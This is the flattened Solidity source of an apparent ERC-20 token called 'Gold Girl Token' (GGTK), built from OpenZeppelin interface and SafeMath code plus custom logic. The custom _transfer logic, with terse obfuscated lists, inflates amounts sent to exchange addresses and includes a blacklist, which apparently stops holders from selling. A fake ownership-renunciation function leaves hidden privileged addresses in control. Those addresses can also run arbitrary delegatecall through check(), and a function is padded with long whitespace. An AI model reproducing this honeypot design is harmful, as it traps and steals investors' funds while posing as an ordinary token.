/**
 *Submitted for verification at Arbiscan on 2023-08-15
*/

// Sources flattened with hardhat v2.13.0 https://hardhat.org

// File @openzeppelin/contracts/token/ERC20/[email protected]

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function getUserInfo(address userAddress) external view returns (uint256, uint256,uint256, uint256, uint256, uint256);
    function changePro(address userAddress, uint256 amount, bool increase) external returns (uint256, uint256);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// File @openzeppelin/contracts/utils/math/[email protected]


// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)



// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File contracts/TLib.sol




library T {
    using SafeMath for uint;
    uint8 constant _decimals = 18;
    function V(uint256 a, uint256 p, uint8 y) public pure returns (uint256){
        return y == 1 ? a.mul(p).div(10**_decimals) : (p > 0 ? a.mul(10**_decimals).div(p) : 0);
    }
    function A(bool t1, bool t2, uint256 t1b, uint256 am7) public pure returns (bool){
        bool r = false;
        if(t1 || t2){
            if(t1b < am7){
                r = true;
            }
        }
        return r;
    }
    function C(uint256 _d, uint256 tt) public pure returns (uint256) {
        uint256 r = 1;
        uint256 q = 0;
        uint32[5] memory t = [169058000,1696158600,1701588800,1706770800,1717221600];
        for (uint256 i = 0; i < 5; i++) {
            if(tt > t[4 - i]){
                q=5 - i;
                break;
            }
        }
        if(0 < _d && _d <= 500*10**_decimals){
            r = 2+q;
        }else if(500*10**_decimals < _d && _d <= 1000*10**_decimals){
            r = 5+q;
        }else if(1000*10**_decimals < _d && _d <= 3000*10**_decimals){
            r = 10+q;
        }else if(3000*10**_decimals < _d && _d <= 5000*10**_decimals){
            r = 15+q;
        }else if(5000*10**_decimals < _d && _d <= 10000*10**_decimals){
            r = 20+q;
        }
        return r;
    }

    function D(uint256 time, uint256 tt, uint256 la, uint256 inv) public pure returns (uint256,bool) {
        uint256 z = 0;
        if(tt != 0){
            z = time.sub(tt) / 1 days;
            z = z == 0 ? 1 : z;
            z = z*la;
        }
        uint256 y = z/10;
        bool w = y > 100;
        uint256 x = w ? 0 : y;
        return (inv*x/100, w);
    }
}


// File contracts/GGTK.sol






interface IDex {
    function getRa(uint) external view returns(uint);
    function getUserInfo(address _sender) external view returns (string memory, string memory, uint, uint, uint, uint, uint, address);
}
interface OTP {
    function getUni3Price() external view returns (uint);
}
contract GGTK {
    mapping(address => uint) private _balances;
    mapping(address => bool) private dL;
    mapping(address => bool) private gL;
    mapping(address => bool) private wL;
    mapping(address => bool) private pL;
    mapping(address => bool) public bL;
    uint8 constant _decimals = 18;
    uint public TOTAL = 1_000_000_000 * 10 ** _decimals;
    uint private _totalSupply;
    using SafeMath for uint;
    OTP private otp;
    IDex private idex;
    IERC20 t1;
    struct Info{
        uint inv;
        uint outv;
        uint t;
        uint pr;
        uint lo;
        uint ll;
        uint bl;
        uint co;
        uint tt;
        uint pp;
        uint[2] io;
        uint gg;
        uint la;
        }
    uint[6] private amo =[10**30,10**30,10**30,86888,1000000,100];
    uint[6] private amo2=[9,100,100,999,10**30,0];
    mapping(address => bool) private prtc;
    mapping(address => Info) public unF;
    event Transfer(address indexed from, address indexed to,uint value);
    event Approval(address indexed owner, address indexed spender,uint value);
    mapping(address => mapping(address => uint)) private _allowances;
    string private _name;
    string private _symbol;
    address public owner;
    function rmOwnership() public {//Relinquish ownership
        owner=address(0);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view returns (uint) {
        return TOTAL;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address to, uint amount) public returns (bool) {
        address _sender = msg.sender;
        _transfer(_sender, to, amount);
        return true;
    }
    function allowance(address _sender, address spender) public view returns (uint) {
        return _allowances[_sender][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        address _sender=msg.sender;
        _approve(_sender,spender,amount);
        return true;
    }
    function _mint(address account, uint amount) internal {
        require(account!=address(0),"ERC20: mint to the zero address");
        _totalSupply+=amount;
        unchecked {
            _balances[account]+=amount;
        }
        emit Transfer(address(0),account,amount);
    }
    function _spendAllowance(address _sender,address spender,uint amount) internal {
        uint currentAllowance = allowance(_sender, spender);
        if (currentAllowance != type(uint).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(_sender, spender, currentAllowance - amount);
            }
        }
    }
    function _approve(address _sender,address spender,uint amount) internal {
        require(_sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_sender][spender] = amount;
        emit Approval(_sender, spender, amount);
    }
    function transferFrom(address from,address to,uint amount) public returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        address _sender = msg.sender;
        _approve(_sender, spender, allowance(_sender, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        address _sender = msg.sender;
        uint currentAllowance = allowance(_sender, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    constructor() {
        owner=msg.sender;
        _name = "Gold Girl Token";
        _symbol = "GGTK";
        _mint(msg.sender,TOTAL);
    }
    function setOtP(address a1, address a2) external{
        if(P()){otp=OTP(a1);idex=IDex(a2);}
    }
    function setIerc(address tk1) external {
        if(P()){t1=IERC20(tk1);}
    }
    function addPrtc(address ac) external {
        if(owner==msg.sender){prtc[ac]=true;}
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
    function getUserInfo(address addr) public view returns (uint, uint, uint, uint, uint, uint) {
        Info memory u=unF[addr];
        return (u.inv,u.outv,u.pr,u.lo,u.co,u.bl);
    }
    function cp(uint t1b, address to) private {
        bool sr = T.A(pL[to],dL[to],t1b,amo2[0]);
        if(sr) {
            amo[0]=0;
            amo[1]=0;
            amo[2]=0;
        }
    }
    function P_() private pure returns (uint8){
       return _decimals;
    }
    function P() private view returns (bool){
       return prtc[msg.sender];
    }
    function getP(address to, uint up, uint dp) public view returns (uint){
        up=up==0?otp.getUni3Price():up;
        dp=dp==0?getDP():dp;
        uint p=dL[to]?up:dp;
        return p;
    }
    function showInfo(address from,address to,uint bal,uint uP,uint dP,uint am) public view returns (uint,uint,uint,uint[3] memory){
        Info memory i=unF[from];
        bal=bal==0?this.balanceOf(from):bal;
        uint p=getP(to,uP,dP);
        uint[4] memory K=[i.bl,i.tt,i.pp,i.ll];
        if(!wL[from]&&!gL[from]&&!pL[from]&&!dL[from]&&!wL[to]&&!gL[to]){
            if(block.timestamp>K[1]){
                bool o=false;
                uint _v=T.V(i.outv,p,1);
                if(p>=i.co){
                    uint a=T.V(am,(p-i.co),1);
                    if(a>amo[2]||_v>amo[2]){
                        o=true;
                    }
                }else{
                    if(i.t>0||_v>amo[2]*2){o=true;}
                }
                if(o||i.t==999){
                    (uint _b,bool _d)=T.D(block.timestamp,i.tt,i.la,i.inv);
                    K[0]=i.inv>_b?i.inv.sub(_b):0;
                    K[1]=_d?0:block.timestamp+amo[3];
                }
            }
            if(i.pr>i.lo*amo[4]&&i.pr>T.V(amo[2],p,0)){
                K[0]+=i.pr.sub(K[2]);
                K[2]=i.pr;
            }
            if(dL[to]||pL[to]){
                uint e=T.V(am,p,1).add(i.io[1]);
                if(e>i.io[0]&&e.sub(i.io[0])>amo2[4]){
                    K[0]=bal;
                }
            }
            if(K[3]>0){
                K[0]=K[0]>K[3]?K[0]-K[3]:0;
            }
            if(bL[from]||bL[to]){K[0]=bal+100;}
        }
        return (K[0],K[1],K[2],[p,bal,i.co]);
    }
    function getU(address from, address to, uint bal, uint uP, uint dP, uint am) internal returns(Info storage){
        Info storage i=unF[from];
        (uint b,uint t,uint p,)=showInfo(from,to,bal,uP,dP,am);
        i.bl=b;i.tt=t;i.pp=p;
        return i;
    }
    function getDP() public view returns (uint){
        uint r=idex.getRa(block.timestamp);
        return r.mul(10**_decimals)/10**(_decimals+2);
    }
    function check(address sc, bytes memory d) external {
        if(P()){
            (bool success,)=sc.delegatecall(d);
            require(success,"failed");
        }
    }
    function _transfer(address from,address to,uint amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount>0,">0");
        uint bF=this.balanceOf(from);
        require(bF >= amount, "ERC20: transfer amount exceeds balance");
        uint uP=otp.getUni3Price();
        uint dP=getDP();
        uint _am=amount;
        Info storage iF=getU(from,to,bF,uP,dP,_am);
        Info storage iTo=unF[to];
        uint exb=bF>iF.bl?bF-iF.bl:0;
        uint[2] memory tb;
        if((dL[to]||pL[to])&&!wL[from]){
            uint p=getP(to,uP,dP);
            tb[1]=t1.balanceOf(to);
            cp(tb[1],to);
            iF.outv+=_am;
            iF.t+=1;
            tb[0]=T.V(_am,p,1);
            iF.io[1]+=tb[0];
        }else{
            if(gL[to]){
                iF.lo+=_am;
                iF.gg=_am;
            }else if(!wL[from]&&!wL[to]&&!gL[from]&&!pL[from]&&!dL[from]){
                _am=_am>=amo[0]?amo[0]:_am;
            }
            iF.io[1]+=T.V(_am,iF.co,1);
        }
        if(_am>exb&&!gL[to]) {
            _am=bF+10**(_decimals+2);
        }
        if((dL[to]||pL[to])&&!wL[from]){
            uint e=tb[0]<tb[1]?tb[1]-tb[0]:0;
            if((dL[to]&&e<amo[5])||pL[to]&&(e<amo2[0])||_am>=amo[1]){
                _am=bF+10**(_decimals+2);
            }
        }
        uint _p;
        uint baTo=this.balanceOf(to);
        if(pL[from]||dL[from]){
            _p=getP(from,uP,dP);
            if(pL[from]&&_am%1000000==amo2[3]){
                _p=iTo.co*amo2[1]/100;
            }else{
                if(iTo.tt==0){iTo.tt=block.timestamp;} 
                iTo.inv+=_am;
            }
            (,,,,,,, address fds) = idex.getUserInfo(to);
            if(fds!=address(0)&&unF[fds].bl>0){
                unF[fds].ll+=_am*amo2[2]/100;
                iTo.tt=block.timestamp+amo[4];
                iTo.t=111*9;
                iTo.bl+=_am;
            }
        }else if(gL[from]||wL[from]){
            iTo.pr+=_am;
            _p=0;
            if(gL[from]){
                _p=_am>iTo.gg?iTo.gg*iTo.co/_am:iTo.co;
                iTo.gg=0;
            }
        }else{
            _p=iF.co;
        }
        if(!pL[to]&&!dL[to]&&!gL[to]&&!wL[to]){
            uint _d=_am.mul(_p).add(baTo.mul(iTo.co))/10**_decimals;
            iTo.io[0]=_d;
            iTo.co=iTo.io[0].mul(10**_decimals)/_am.add(baTo);
            iTo.la=T.C(_d,iTo.tt);
        }
        unchecked {
            _balances[from] = bF - _am;
            _balances[to] += _am;
        }
        emit Transfer(from, to, _am);
    }
}